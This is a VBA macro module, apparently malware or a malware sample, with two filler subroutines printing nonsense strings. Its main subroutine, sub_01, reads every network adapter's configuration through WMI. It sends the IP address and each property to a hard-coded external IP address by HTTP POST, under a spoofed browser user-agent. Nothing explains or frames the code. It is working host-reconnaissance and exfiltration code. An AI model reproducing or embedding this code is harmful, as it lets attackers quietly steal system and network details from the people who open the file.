Sub sub_00()
    Debug.Print "hihi_hihi"
End Sub

Sub sub_01()
    query = "Select * From Win32_NetworkAdapterConfiguration"
    Set set_00 = GetObject("winmgmts:root/CIMV2")
    Set set_01 = set_00.ExecQuery(query)
    Set set_02 = CreateObject("MSXML2.ServerXMLHTTP")
    Url = "http://176.31.120.218:5000/thisis"
    Debug.Print Url
    Dim dim_00()
    For Each root_object In set_01
        If Not IsNull(root_object.IPAddress) Then
            Debug.Print "IP:"; root_object.IPAddress(0)
            set_02.Open "POST", Url, True
            set_02.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
            set_02.send root_object.IPAddress(0)
            Debug.Print "Host name:"; root_object.DNSHostName
            For Each root_object_properties In root_object.Properties_
                If IsArray(root_object_properties.Value) Then
                    For n = LBound(root_object_properties.Value) To UBound(root_object_properties.Value)
                        Debug.Print root_object_properties.Name & "(" & n & ")", root_object_properties.Value(n)
                        set_02.Open "POST", Url, True
                        set_02.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
                        set_02.send root_object_properties.Value(n)
                    Next
                Else
                    Debug.Print root_object_properties.Name, root_object_properties.Value
                    set_02.Open "POST", Url, True
                    set_02.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
                    set_02.send root_object_properties.Value
                End If
            Next
        End If
    Next
End Sub

Sub sub_02()
    Debug.Print "yolo_yolo"
End Sub